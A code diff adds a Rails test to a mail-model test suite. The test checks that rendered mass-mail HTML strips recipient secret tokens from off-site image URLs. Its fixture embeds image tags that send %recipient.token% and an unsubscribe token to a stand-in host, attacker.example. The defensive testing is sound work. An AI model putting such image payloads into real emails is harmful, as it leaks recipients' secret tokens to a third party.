@@ -105,6 +105,22 @@ class PmailsTest < ActiveSupport::TestCase
     assert_includes pmail.errors[:local_group], 'must belong to the same organisation'
   end
 
+  test 'pmail html strips recipient secrets from off-site images' do
+    create_organisation
+    pmail = FactoryBot.create(
+      :pmail,
+      organisation: @organisation,
+      everyone: true,
+      preview_text: '<img src="https://attacker.example/%recipient.org_unsubscribe_token%">',
+      body: '<p>Hi %recipient.firstname%</p><img src="https://attacker.example/%recipient.token%">'
+    )
+    html = pmail.html
+
+    refute_match(%r{src="[^"]*%recipient\.token%}, html)
+    refute_match(%r{src="[^"]*%recipient\.org_unsubscribe_token%}, html)
+    assert_includes html, '%recipient.firstname%'
+  end
+
   test 'pmail can exclude a cohosted event' do
     create_organisation
     event = FactoryBot.create(:event)
